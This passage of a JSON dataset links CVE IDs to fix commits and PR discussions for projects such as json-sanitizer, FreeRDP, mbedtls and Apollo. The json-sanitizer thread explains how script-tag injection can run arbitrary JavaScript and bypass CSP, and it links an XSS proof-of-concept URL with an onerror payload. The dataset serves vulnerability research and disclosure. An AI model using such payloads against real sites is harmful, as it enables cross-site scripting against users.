in injection point 2 to execute arbitrary JS, which I believe would not be possible without the JSON injection. This also applies if injection point 2 comes right after the script end tag on the same line. I currently don't see a way for this to work if `</script>` is followed by a line break, but there may be some part of the JS syntax I have missed.\r\n\r\nAll in all, the full scope seems pretty difficult to assess, but most embedders could at least suffer from a broken page as a result of sucu injection. Everything beyond that is probably more of a theoretical issue.\r\n\r\n Fix included in [:1.2.1](https://search.maven.org/search?q=g:com.mikesamuel%20AND%20a:json-sanitizer%20AND%20v:1.2.1) which should be indexed by maven shortly.\r\n\r\n@FabianHenneke did you request a CVE for this or would you like me to?\r\n\r\nHere's a second draft of the announcement.\r\n\r\n----\r\n\r\n# Users of *com.mikesamuel:json-sanitizer* should upgrade to version 1.2.1 or later.\r\n\r\nA bug in *com.mikesamuel:json-sanitizer:1.2.0* and prior allows an attacker who controls the content of a JSON string that is later embedded in an HTML `<script>` element to confuse the HTML parser as to where the `<script>` element ends.  If the attacker also controls other content, e.g. a string of non-JavaScript content adjacent to the `<script>` element, this can lead to RCE.\r\n\r\nSee https://github.com/OWASP/json-sanitizer/pull/20#issue-427776274 for details.\r\n\r\nIf you have questions, please ask at the [json-sanitizer-support](https://groups.google.com/forum/#!forum/json-sanitizer-support) Google Group.\r\n > @FabianHenneke did you request a CVE for this or would you like me to?\r\n\r\n@mikesamuel I haven't. Should this go directly through MITRE or to another CNA? I would generally prefer you to do the filing in order to keep the CVE metadata consistent for this project, but can take care of it if you are busy.\r\n\r\n> If the attacker also controls other content, e.g. a string of non-JavaScript content adjacent to the `<script>` element, this can lead to RCE.\r\n\r\nHow about the following, which is currently my best shot at describing the scope:\r\n\r\n> This can be used to prevent the execution of `<script>` elements. If the attacker additionally controls content in or right after the `</script>` end tag, this could lead to the execution of arbitrary JavaScript and a bypass of nonce-based CSPs.\r\n\r\nTo me, RCE in the context of a Java project sounds a bit more dramatic than \"execution of arbitrary JavaScript\", which is why I went for the latter. Feel free to tweak this further though.\r\n\r\n Why CVE? The injection occurs only if there is an attack payload as a JSON value. The sanitizer is meant to disallow illegal JSON structure not sanitize individual values per my understanding.\n\nI assume that data submitted server-side in untrusted JSON still needs to be used safely (ie: query parameterization, etc).\n\nI assume that JSON data embedded in HTML markup still needs to be encoded to embed it safely. (JSON  serializer and encoder like \nhttps://github.com/yahoo/serialize-javascript )\n\nMay I ask what security use case is broken and what are we fixing that needs a CVE?\n\nAloha,\n--\nJim Manico\n@Manicode\n\n\n> On Jun 8, 2020, at 2:32 AM, Fabian Henneke <notifications@github.com> wrote:\n> \n> \ufeff\n> @FabianHenneke did you request a CVE for this or would you like me to?\n> \n> @mikesamuel I haven't. Should this go directly through MITRE or to another CNA? I would generally prefer you to do the filing in order to keep the CVE metadata consistent for this project, but can take care of it if you are busy.\n> \n> If the attacker also controls other content, e.g. a string of non-JavaScript content adjacent to the <script> element, this can lead to RCE.\n> \n> How about the following, which is currently my best shot at describing the scope:\n> \n> This can be used to prevent the execution of <script> elements. If the attacker additionally controls content in or right after the </script> end tag, this could lead to the execution of arbitrary JavaScript and a bypass of nonce-based CSPs.\n> \n> To me, RCE in the context of a Java project sounds a bit more dramatic than \"execution of arbitrary JavaScript\", which is why I went for the latter. Feel free to tweak this further though.\n> \n> \u2014\n> You are receiving this because you commented.\n> Reply to this email directly, view it on GitHub, or unsubscribe.\n > I assume that JSON data embedded in HTML markup still needs to be encoded to embed it safely. \r\nhttps://github.com/OWASP/json-sanitizer#output says\r\n\r\n> The output will not contain the substrings (case-insensitively) `\"<script\"`, `\"</script\"` and `\"<!--\"` and can thus be embedded inside an HTML script element without further encoding. > > @FabianHenneke did you request a CVE for this or would you like me to?\r\n> \r\n> @mikesamuel I haven't. Should this go directly through MITRE or to another CNA? I would generally prefer you to do the filing in order to keep the CVE metadata consistent for this project, but can take care of it if you are busy.\r\n\r\nI am currently unaffiliated with any other CNA, so I was going to go through MITRE.\r\nI'll take care of it.\r\n\r\n\r\n> > If the attacker also controls other content, e.g. a string of non-JavaScript content adjacent to the `<script>` element, this can lead to RCE.\r\n> \r\n> How about the following, which is currently my best shot at describing the scope:\r\n> \r\n> > This can be used to prevent the execution of `<script>` elements. If the attacker additionally controls content in or right after the `</script>` end tag, this could lead to the execution of arbitrary JavaScript and a bypass of nonce-based CSPs.\r\n> \r\n> To me, RCE in the context of a Java project sounds a bit more dramatic than \"execution of arbitrary JavaScript\", which is why I went for the latter. Feel free to tweak this further though.\r\n\r\nGood point.  Will do. Understood, of course. I only use this tool server-side before hitting a JSON parser. \n\nYea, a CVE is in order. \n\n--\nJim Manico\n@Manicode\n\n> On Jun 8, 2020, at 10:19 AM, Mike Samuel <notifications@github.com> wrote:\n> \n> \ufeff\n> I assume that JSON data embedded in HTML markup still needs to be encoded to embed it safely.\n> https://github.com/OWASP/json-sanitizer#output says\n> \n> The output will not contain the substrings (case-insensitively) \"<script\", \"</script\" and \"<!--\" and can thus be embedded inside an HTML script element without further encoding.\n> \n> \u2014\n> You are receiving this because you commented.\n> Reply to this email directly, view it on GitHub, or unsubscribe.\n Ok.  CVE request is before the CVE gnomes. @mikesamuel I missed another way this could be abused: If there is a second injection point that allows `</script>`, this can also lead to XSS. See http://portswigger-labs.net/xss/script.php?x=%3C!--%3Cscript%3E&y=%3C/script%3E%3Cimg%20src=1%20onerror=alert(1)%3E for an example. CVE-2020-13973",
            "pr_title_words": 5,
            "comments_words": 1893,
            "total_other_info_words": 1898
        },
        {
            "cve-id": "CVE-2020-29367",
            "commit_url": "https://github.com/Blosc/c-blosc2/commit/c4c6470e88210afc95262c8b9fcc27e30ca043ee",
            "commit_msg": "Fixed asan heap buffer overflow when not enough space to write compressed block size.",
            "commit_msg_words": 14,
            "other_info": "Fixed ASAN overflow when not enough space to write compressed block size > https://oss-fuzz.com/testcase-detail/6243033163759616\r\n\r\nIt looks like I don't have access there. Could you add me there? This file https://github.com/google/oss-fuzz/blob/master/projects/c-blosc2/project.yaml says blosc.oss.fuzz@gmail.com should have access. Thanks for the reminder. I forgot the special blosc.oss.fuzz@gmail.com user.",
            "pr_title_words": 12,
            "comments_words": 33,
            "total_other_info_words": 45
        },
        {
            "cve-id": "CVE-2020-22218",
            "commit_url": "https://github.com/libssh2/libssh2/commit/41533173d27140400a17c49314efde6df54abdeb",
            "commit_msg": "fix use-of-uninitialized-value\n\nreturn error if malloc(0)",
            "commit_msg_words": 6,
            "other_info": "fix use-of-uninitialized-value Looks good, thanks! CVE-2020-22218 was assigned to this, and NVD scored it as \"high\" severity.\r\n\r\nI had not involvement in the assignment. I'm commenting here for reference.",
            "pr_title_words": 2,
            "comments_words": 27,
            "total_other_info_words": 29
        },
        {
            "cve-id": "CVE-2020-36636",
            "commit_url": "https://github.com/openmrs/openmrs-module-adminui/commit/702fbfdac7c4418f23bb5f6452482b4a88020061",
            "commit_msg": "RA-1865: Fix possible xss in account setup (#57)",
            "commit_msg_words": 8,
            "other_info": "RA-1865: Fix possible xss in account setup Thanks @isears \ud83d\udc4d",
            "pr_title_words": 7,
            "comments_words": 3,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2020-12762",
            "commit_url": "https://github.com/json-c/json-c/commit/099016b7e8d70a6d5dd814e788bba08d33d48426",
            "commit_msg": "Protect array_list_del_idx against size_t overflow.\n\nIf the assignment of stop overflows due to idx and count being\nlarger than SIZE_T_MAX in sum, out of boundary access could happen.\n\nIt takes invalid usage of this function for this to happen, but\nI decided to add this check so array_list_del_idx is as safe against\nbad usage as the other arraylist functions.",
            "commit_msg_words": 59,
            "other_info": "Prevent out of boundary write on malicious input \n[![Coverage Status](https://coveralls.io/builds/30606764/badge)](https://coveralls.io/builds/30606764)\n\nCoverage decreased (-0.2%) to 85.768% when pulling **d07b91014986900a3a75f306d302e13e005e9d67 on stoeckmann:oob** into **8e3d3d55449a358c662e73ce6f539d44c8053e2c on json-c:master**.\n The changes look good, thanks!",
            "pr_title_words": 8,
            "comments_words": 21,
            "total_other_info_words": 29
        },
        {
            "cve-id": "CVE-2020-13397",
            "commit_url": "https://github.com/FreeRDP/FreeRDP/commit/d6cd14059b257318f176c0ba3ee0a348826a9ef8",
            "commit_msg": "Fixed GHSL-2020-101 missing NULL check\n\n(cherry picked from commit b207dbba35c505bbc3ad5aadc10b34980c6b7e8e)",
            "commit_msg_words": 10,
            "other_info": "Stable backport cve \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4974/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4976/\n @akallabeth are all uninitialized pointers guaranteed to always be set to NULL? I noted that the CVE page states that this patch is re an uninitialized pointer issue, but if the uninitialized pointer is not specifically set to NULL, it will still pass this check. @tcullum-rh the `rdp` struct is initialized with `calloc` so yes. @akallabeth awesome, thanks and thank you for all your hard work on this project!",
            "pr_title_words": 3,
            "comments_words": 97,
            "total_other_info_words": 100
        },
        {
            "cve-id": "CVE-2020-27560",
            "commit_url": "https://github.com/ImageMagick/ImageMagick/commit/ef59bd764f88d893f1219fee8ba696a5d3f8c1c4",
            "commit_msg": "There is a Division by Zero in function OptimizeLayerFrames (#2743)\n\nin file MagickCore/layer.c. cur->ticks_per_seconds can be zero\r\nwith a crafted input argument *image. This is similar to\r\nCVE-2019-13454.",
            "commit_msg_words": 28,
            "other_info": "There is a Division by Zero in function OptimizeLayerFrames",
            "pr_title_words": 9,
            "comments_words": 0,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2020-26272",
            "commit_url": "https://github.com/electron/electron/commit/07a1c2a3e5845901f7e2eda9506695be58edc73c",
            "commit_msg": "fix: restrict sendToFrame to same-process frames by default (#26875)",
            "commit_msg_words": 9,
            "other_info": "fix: restrict sendToFrame to same-process frames by default CI failures are flakes. **Release Notes Persisted**\n\n> Fixed an issue where `event.reply` could sometimes not deliver a reply to an IPC message when cross-site iframes were present. I was unable to backport this PR to \"10-x-y\" cleanly;\n   you will need to perform this backport manually. I was unable to backport this PR to \"11-x-y\" cleanly;\n   you will need to perform this backport manually. I was unable to backport this PR to \"9-x-y\" cleanly;\n   you will need to perform this backport manually. I was unable to backport this PR to \"12-x-y\" cleanly;\n   you will need to perform this backport manually. @nornagon has manually backported this PR to \"12-x-y\", please check out #26925 @nornagon has manually backported this PR to \"11-x-y\", please check out #26926 @nornagon has manually backported this PR to \"10-x-y\", please check out #26927 @nornagon has manually backported this PR to \"9-x-y\", please check out #26928 @nornagon has manually backported this PR to \"master\", please check out #27072",
            "pr_title_words": 8,
            "comments_words": 160,
            "total_other_info_words": 168
        },
        {
            "cve-id": "CVE-2020-6851",
            "commit_url": "https://github.com/uclouvain/openjpeg/commit/024b8407392cb0b82b04b58ed256094ed5799e04",
            "commit_msg": "opj_j2k_update_image_dimensions(): reject images whose coordinates are beyond INT_MAX (fixes #1228)",
            "commit_msg_words": 10,
            "other_info": "opj_j2k_update_image_dimensions(): reject images whose coordinates are beyond INT_MAX (fixes #1228)",
            "pr_title_words": 10,
            "comments_words": 0,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2020-11099",
            "commit_url": "https://github.com/FreeRDP/FreeRDP/commit/6ade7b4cbfd71c54b3d724e8f2d6ac76a58e879a",
            "commit_msg": "Fixed OOB Read in license_read_new_or_upgrade_license_packet\n\nCVE-2020-11099 thanks to @antonio-morales for finding this.",
            "commit_msg_words": 12,
            "other_info": "Fixes \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/5060/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/5061/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/5062/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/5063/",
            "pr_title_words": 1,
            "comments_words": 56,
            "total_other_info_words": 57
        },
        {
            "cve-id": "CVE-2020-15232",
            "commit_url": "https://github.com/mapfish/mapfish-print/commit/e1d0527d13db06b2b62ca7d6afb9e97dacd67a0e",
            "commit_msg": "See: https://github.com/mapfish/mapfish-print/security/code-scanning/3?query=ref%3Arefs%2Fheads%2Fmaster",
            "commit_msg_words": 2,
            "other_info": "Fix some security issues This pull request **fixes 4 alerts** when merging 89155f2506b9cee822e15ce60ccae390a1419d5e into afc248cbfdf176789a0e848d876c0f34e8d555bc - [view on LGTM.com](https://lgtm.com/projects/g/mapfish/mapfish-print/rev/pr-baff6ebf44b644234ad9e03661e3092e9733e02f)\n\n**fixed alerts:**\n\n* 3 for Cross\\-site scripting\n* 1 for Resolving XML external entity in user\\-controlled data \ud83d\udc4b @sbrunner, can you elaborate a bit more about the issues at hand? \r\nIm from [Snyk](snyk.io) and if these are indeed vulnerabilities we would like to add it to our database with full context.  @gurshafriri \r\nI just change the title, for me, its potential security vulnerabilities detected by CodeQL I provide the links in the commits, all fixed issues:\r\n- https://github.com/mapfish/mapfish-print/security/code-scanning/3?query=ref%3Arefs%2Fheads%2Fmaster\r\n- https://github.com/mapfish/mapfish-print/security/code-scanning/5?query=ref%3Arefs%2Fheads%2Fmaster\r\n- https://github.com/mapfish/mapfish-print/security/code-scanning/6?query=ref%3Arefs%2Fheads%2Fmaster\r\n- https://github.com/mapfish/mapfish-print/security/code-scanning/7?query=ref%3Arefs%2Fheads%2Fmaster I also publish my 2 first GitHub Security Advisories. @sbrunner thanks - but the links are broken for us. \r\nDo you have the GitHub Security Advisory ID's?  Like this?\r\n* https://github.com/mapfish/mapfish-print/security/advisories/GHSA-w534-q4xf-h5v2\r\n* https://github.com/mapfish/mapfish-print/security/advisories/GHSA-vjv6-gq77-3mjw",
            "pr_title_words": 4,
            "comments_words": 132,
            "total_other_info_words": 136
        },
        {
            "cve-id": "CVE-2020-10019",
            "commit_url": "https://github.com/zephyrproject-rtos/zephyr/commit/8183a87931538650f09c00d8d51fbc2236600646",
            "commit_msg": "usb: dfu: check requested length (wLength) during DFU_UPLOAD\n\nDuring DFU_UPLOAD, the host could requests more data\nas stated in wTransferSize. Limit upload length to the\nsize of the request buffer (USB_REQUEST_BUFFER_SIZE).\n\nSigned-off-by: Johann Fischer <j.fischer@phytec.de>",
            "commit_msg_words": 35,
            "other_info": "usb: dfu: check requested length (wLength) during DFU_UPLOAD",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2020-24133",
            "commit_url": "https://github.com/radareorg/radare2-extras/commit/4a8b24475549ff10bdf6d07fd4b5f6c1cc6246ea",
            "commit_msg": "patch two stack buffer overflow. In disassembling swf function",
            "commit_msg_words": 9,
            "other_info": "patch Heap overflow There are some more coding style and lots of refactoring needed to cleanup this code. But im merging to save the world from segfaults for now. Would you like to do further cleanips in here?\r\n\r\nThanks!",
            "pr_title_words": 3,
            "comments_words": 36,
            "total_other_info_words": 39
        },
        {
            "cve-id": "CVE-2020-7226",
            "commit_url": "https://github.com/vt-middleware/cryptacular/commit/8c6c7528f1e24c6b71f3e36db0cb8a697256ce25",
            "commit_msg": "Define new ciphertext header format.\n\nNew format does not allocate any memory until HMAC check passes, which\nguards against untrusted input. All encryption components have been\nupdated to use the new header, while preserving backward compatibility\nto decrypt messages encrypted with the old format. The decoding process\nfor the old header has been hardened to impose reasonable limits on header\nfields: nonce sizes up to 255 bytes, key names up to 500 bytes.\n\nFixes #52.",
            "commit_msg_words": 75,
            "other_info": "Define new ciphertext header format.",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2020-11045",
            "commit_url": "https://github.com/FreeRDP/FreeRDP/commit/f8890a645c221823ac133dbf991f8a65ae50d637",
            "commit_msg": "Fixed #6005: Bounds checks in update_read_bitmap_data",
            "commit_msg_words": 6,
            "other_info": "Fix issues with boundary access. \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4756/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4757/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4758/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4759/\n @hardening will address your comments in a separate PR, I think better merge this now as it is already big enough. \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4766/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4767/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4768/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4769/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4770/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/4771/",
            "pr_title_words": 5,
            "comments_words": 161,
            "total_other_info_words": 166
        },
        {
            "cve-id": "CVE-2020-10994",
            "commit_url": "https://github.com/python-pillow/Pillow/commit/cf6da6b79080a8c16984102fdc85f7ce28dca613",
            "commit_msg": "Fix for OOB Read in DecodeJpeg2k",
            "commit_msg_words": 6,
            "other_info": "Fix bounds overflow in JPEG 2000 decoding",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2020-36425",
            "commit_url": "https://github.com/Mbed-TLS/mbedtls/commit/a4e86141f1451e8097f85a823a4426e1c1cfdf7c",
            "commit_msg": "Always revoke certificate on CRL\n\nRFC5280 does not state that the `revocationDate` should be checked.\n\nIn addition, when no time source is available (i.e., when MBEDTLS_HAVE_TIME_DATE is not defined), `mbedtls_x509_time_is_past` always returns 0. This results in the CRL not being checked at all.\n\nhttps://tools.ietf.org/html/rfc5280\nSigned-off-by: Raoul Strackx <raoul.strackx@fortanix.com>",
            "commit_msg_words": 48,
            "other_info": "Always revoke certificate on CRL Thanks for your contribution! I agree with your assessment: I looked at all instances of \"revocationDate\" in  RFC 5280 and it never says that it should be checked. Moreover, point (j) on [page 95](https://tools.ietf.org/html/rfc5280#page-95) says to marked as revoked as soon as issuer name and serial number match. It looks like this field is more informational (a bit like the optional \"reason\" field.) Also, from a security perspective, if the certificate ended up on a CRL, it shouldn't be trusted regardless of the revocation date, especially considering the local clock can't always be trusted.\r\n\r\nThe new behaviour should come with a test. Please generate a CRL with a revocation date in the far future (to make sure it's still in the future in a few years) for one of our existing certificate and add a test for verifying this certificate with that CRL using the function `x509_verify` in `tests/suites/test_suite_x509parse.data`. The generated CRL file should live in `tests/data_files` and its generation method documented in `tests/data_files/Makefile`. In order to obtain a revocation date in the future, you might need to use the `faketime` utility (see examples in that Makefile). Feel free to ask for help on testing if needed, we're aware that out test system is not always intuitive first time you touch it.\r\n\r\nSince this changes the observable behaviour, it deserves an entry in our ChangeLog, I'd say under `Bugfix` as the current behaviour isn't in accordance to the standard. Can you write one? See [https://github.com/ARMmbed/mbedtls/blob/development/ChangeLog.d/00README.md](the ChangeLog README).\r\n\r\nFinally, can you add a Signed-Off-By line to your commit message, ton indicate that you agree with our [licensing terms](https://github.com/ARMmbed/mbedtls#license)?\r\n @mpg could you send me the output of CI? Running the tests locally doesn't give me much insight. There are failed tests, but those fail on the development branch too. One of the tests that fail is:\r\n\r\nclient:\r\n```\r\n../programs/ssl/ssl_client2 server_port=14928 server_addr=127.0.0.1 force_version=tls1_2 ca_file=none auth_mode=none crt_file=none key_file=none force_ciphersuite=TLS-ECDHE-ECDSA-WITH-AES-128-CBC-SHA256\r\n                                                                                                                                                                                                                                             \r\n  . Seeding the random number generator... ok                                                                                                                                                                                                \r\n  . Loading the CA root certificate ... ok (0 skipped)                                                                                                                                                                                       \r\n  . Loading the client cert. and key... ok (key type: invalid PK)                                                                                                                                                                            \r\n  . Connecting to tcp/127.0.0.1/14928... ok                                                                                                                                                                                                  \r\n  . Setting up the SSL/TLS structure... ok                                                                                                                                                                                                   \r\n  . Performing the SSL/TLS handshake... failed                                                                                                                                                                                               \r\n  ! mbedtls_ssl_handshake returned -0x7780                                                                                                                                                                                                   \r\n                                                                                                                                                                                                                                             \r\nLast error was: -0x7780 - SSL - A fatal alert message was received from our peer                                                                                                                                                             \r\n                                                                                                                                                                                                                                             \r\nEXIT: 1                                                                                                                                                                                                                                      \r\nEXIT: 1\r\n```\r\n\r\nserver:\r\n```\r\ngnutls-serv -p 14928 --http  --disable-client-cert --x509certfile data_files/server5.crt --x509keyfile data_files/server5.key --priority NORMAL:+AES-256-CCM-8:+AES-128-CCM-8:+ARCFOUR-128:+NULL:+MD5:+PSK:+DHE-PSK:+ECDHE-PSK:+RSA-PSK:-VERS-TLS-ALL:+VERS-TLS1.2                                                                                                                                                                                                                        \r\nHTTP Server listening on IPv4 0.0.0.0 port 14928...done\r\nHTTP Server listening on IPv6 :: port 14928...done                                                                                                                                                                                           \r\nNo certificates found!                                                                                                                                                                                                                       \r\nSet static Diffie-Hellman parameters, consider --dhparams.                                                                                                                                                                                   \r\n                                                                                                                                                                                                                                             \r\n* Accepted connection from IPv4 127.0.0.1 port 51090 on Wed Jul  1 13:45:09 2020                                                                                                                                                             \r\n- Description: (TLS1.2)-(ECDHE-ECDSA-SECP521R1)-(AES-128-CBC)-(SHA1)                                                                                                                                                                         \r\n- Session ID: 3A:1B:0B:91:85:1B:B3:D2:D3:CA:5B:83:6B:AD:8C:B0:35:4A:21:01:72:E6:F5:B3:65:73:0D:F0:E0:C6:D3:21                                                                                                                                \r\n- Given server name[1]: localhost                                                                                                                                                                                                            \r\n- Ephemeral EC Diffie-Hellman parameters                                                                                                                                                                                                     \r\n - Using curve: SECP521R1                                                                                                                                                                                                                    \r\n - Curve size: 528 bits                                                                                                                                                                                                                      \r\n- Version: TLS1.2\r\n- Key Exchange: ECDHE-ECDSA\r\n- Server Signature: ECDSA-SHA512\r\n- Cipher: AES-128-CBC\r\n- MAC: SHA1\r\n- Compression: NULL\r\n- Options: extended master secret, safe renegotiation, EtM,\r\n- Channel binding 'tls-unique': 0c25dc0a33cd9291f2a8d0e0\r\nNo certificates found!\r\n\r\n* Accepted connection from IPv4 127.0.0.1 port 51092 on Wed Jul  1 13:45:09 2020\r\n- Description: (TLS1.2)-(ECDHE-ECDSA-SECP521R1)-(AES-256-CBC)-(SHA1)\r\n- Session ID: 6F:38:69:0F:4D:1E:24:32:B2:1A:F6:E3:51:86:B9:1E:23:87:83:27:D3:A5:2A:26:29:6B:61:3B:FB:D6:60:39\r\n- Given server name[1]: localhost\r\n- Ephemeral EC Diffie-Hellman parameters\r\n - Using curve: SECP521R1\r\n - Curve size: 528 bits\r\n- Version: TLS1.2\r\n- Key Exchange: ECDHE-ECDSA\r\n- Server Signature: ECDSA-SHA512\r\n- Cipher: AES-256-CBC\r\n- MAC: SHA1\r\n- Compression: NULL\r\n- Options: extended master secret, safe renegotiation, EtM,\r\n- Channel binding 'tls-unique': f2fe159ed656e501fe4a5b85\r\nError in handshake\r\n``` You don't need to do anything else to pass CI.\r\n\r\n* Travis passed.\r\n* `pr-head` had a single test case failure which is in a DTLS test where an unexpected resend happened. This can happen if the OS drops a UDP packet, which is rare but possible. So that's as good as a pass.\r\n* `pr-merge` passed with an older version of `development`, and didn't run with the latest version due to the \"needs work\" label. I've kicked a new run, should be over in an hour or so.\r\n* Mbed OS jobs are failing due to an unrelated change on the Mbed OS side. We're ignoring Mbed OS CI results until that's fixed.\r\n\r\nIf you're getting failures with interoperability tests locally, it's probably because you're using different versions of OpenSSL and GnuTLS. Different tests need different versions because older versions lack some features or have bugs, and newer versions have removed some obsolete features. The docker image in `tests/docker` should work.\r\n Oh that nice! Thanks for the fast reply! Could this get a second review, please? Hi, I am looking at this as the second reviewer and I have a question related to the first added test (with MBEDTLS_HAVE_TIME_DATE enabled). I was expecting that if I reverted the change in library/x509_crt.c (restoring the check of the revocation date) the test would fail. I tried but the test is passing (I've compiled the library and the tests with the default config and run the unit tests). What am I missing?  The failures on Travis can be ignored, they're an instance of https://github.com/ARMmbed/mbedtls/issues/3520 and unrelated to this PR - the Mbed OS failures can also be ignored for similar reasons.\r\n\r\nSo this PR is all good, I think now's a good time to start preparing backports. Thanks for your help!\r\n\r\nWho would be backporting the patch? Well, if you're willing to do it, that would be much appreciated. It would involve raising two new PRs, one targeting mbedtls-2.16, the other targeting mbedtls-2.7, with the same content as this one (usually `git cherry-pick` is helpful for that), and then linking to those in this PR's description.\r\n\r\nOtherwise, we can handle it ourselves, but that may be a bit slower as that means involving more people on our side (1 for creating the PRs, 2 for reviewing them, while if you can create the PRs, the 2 reviewers who approved the original can usually review the backports pretty quickly).\r\n\r\nJust let us know. Sure I can do that. Backported as #3561 and #3562  Unfortunately, there's a conflict. It's a simple add/add conflict, but it prevents merging. Please either merge with the latest state of the `development` branch or rebase on top of `development`.\r\n Thanks. Please resolve the similar conflict in the backports as well. Sorry for the late response. Merge conflicts have been resolved",
            "pr_title_words": 5,
            "comments_words": 1049,
            "total_other_info_words": 1054
        },
        {
            "cve-id": "CVE-2020-15170",
            "commit_url": "https://github.com/apolloconfig/apollo/commit/ae9ba6cfd32ed80469f162e5e3583e2477862ddf",
            "commit_msg": "add access control support for admin service",
            "commit_msg_words": 7,
            "other_info": "add access control support for admin service # [Codecov](https://codecov.io/gh/ctripcorp/apollo/pull/3233?src=pr&el=h1) Report\n> Merging [#3233](https://codecov.io/gh/ctripcorp/apollo/pull/3233?src=pr&el=desc) into [master](https://codecov.io/gh/ctripcorp/apollo/commit/8c5d79f118421157aa96a4e859e1a2c08c01babb&el=desc) will **increase** coverage by `0.44%`.\n> The diff coverage is `92.39%`.\n\n[![Impacted file tree graph](https://codecov.io/gh/ctripcorp/apollo/pull/3233/graphs/tree.svg?width=650&height=150&src=pr&token=2USkCxREbZ)](https://codecov.io/gh/ctripcorp/apollo/pull/3233?src=pr&el=tree)\n\n```diff\n@@             Coverage Diff              @@\n##             master    #3233      +/-   ##\n============================================\n+ Coverage     51.05%   51.49%   +0.44%     \n- Complexity     2270     2296      +26     \n============================================\n  Files           440      442       +2     \n  Lines         13660    13739      +79     \n  Branches       1389     1398       +9     \n============================================\n+ Hits           6974     7075     +101     \n+ Misses         6199     6175      -24     \n- Partials        487      489       +2     \n```\n\n\n| [Impacted Files](https://codecov.io/gh/ctripcorp/apollo/pull/3233?src=pr&el=tree) | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| [...m/ctrip/framework/apollo/biz/config/BizConfig.java](https://codecov.io/gh/ctripcorp/apollo/pull/3233/diff?src=pr&el=tree#diff-YXBvbGxvLWJpei9zcmMvbWFpbi9qYXZhL2NvbS9jdHJpcC9mcmFtZXdvcmsvYXBvbGxvL2Jpei9jb25maWcvQml6Q29uZmlnLmphdmE=) | `26.78% <0.00%> (-1.00%)` | `8.00 <0.00> (\u00f8)` | |\n| [...k/apollo/portal/component/config/PortalConfig.java](https://codecov.io/gh/ctripcorp/apollo/pull/3233/diff?src=pr&el=tree#diff-YXBvbGxvLXBvcnRhbC9zcmMvbWFpbi9qYXZhL2NvbS9jdHJpcC9mcmFtZXdvcmsvYXBvbGxvL3BvcnRhbC9jb21wb25lbnQvY29uZmlnL1BvcnRhbENvbmZpZy5qYXZh) | `22.82% <0.00%> (-0.26%)` | `9.00 <0.00> (\u00f8)` | |\n| [...apollo/portal/component/RetryableRestTemplate.java](https://codecov.io/gh/ctripcorp/apollo/pull/3233/diff?src=pr&el=tree#diff-YXBvbGxvLXBvcnRhbC9zcmMvbWFpbi9qYXZhL2NvbS9jdHJpcC9mcmFtZXdvcmsvYXBvbGxvL3BvcnRhbC9jb21wb25lbnQvUmV0cnlhYmxlUmVzdFRlbXBsYXRlLmphdmE=) | `79.84% <90.90%> (+16.68%)` | `29.00 <7.00> (+9.00)` | |\n| [...lo/adminservice/AdminServiceAutoConfiguration.java](https://codecov.io/gh/ctripcorp/apollo/pull/3233/diff?src=pr&el=tree#diff-YXBvbGxvLWFkbWluc2VydmljZS9zcmMvbWFpbi9qYXZhL2NvbS9jdHJpcC9mcmFtZXdvcmsvYXBvbGxvL2FkbWluc2VydmljZS9BZG1pblNlcnZpY2VBdXRvQ29uZmlndXJhdGlvbi5qYXZh) | `100.00% <100.00%> (\u00f8)` | `2.00 <2.00> (?)` | |\n| [...rvice/filter/AdminServiceAuthenticationFilter.java](https://codecov.io/gh/ctripcorp/apollo/pull/3233/diff?src=pr&el=tree#diff-YXBvbGxvLWFkbWluc2VydmljZS9zcmMvbWFpbi9qYXZhL2NvbS9jdHJpcC9mcmFtZXdvcmsvYXBvbGxvL2FkbWluc2VydmljZS9maWx0ZXIvQWRtaW5TZXJ2aWNlQXV0aGVudGljYXRpb25GaWx0ZXIuamF2YQ==) | `100.00% <100.00%> (\u00f8)` | `11.00 <11.00> (?)` | |\n| [...nfigservice/filter/ClientAuthenticationFilter.java](https://codecov.io/gh/ctripcorp/apollo/pull/3233/diff?src=pr&el=tree#diff-YXBvbGxvLWNvbmZpZ3NlcnZpY2Uvc3JjL21haW4vamF2YS9jb20vY3RyaXAvZnJhbWV3b3JrL2Fwb2xsby9jb25maWdzZXJ2aWNlL2ZpbHRlci9DbGllbnRBdXRoZW50aWNhdGlvbkZpbHRlci5qYXZh) | `91.30% <100.00%> (\u00f8)` | `14.00 <0.00> (\u00f8)` | |\n| 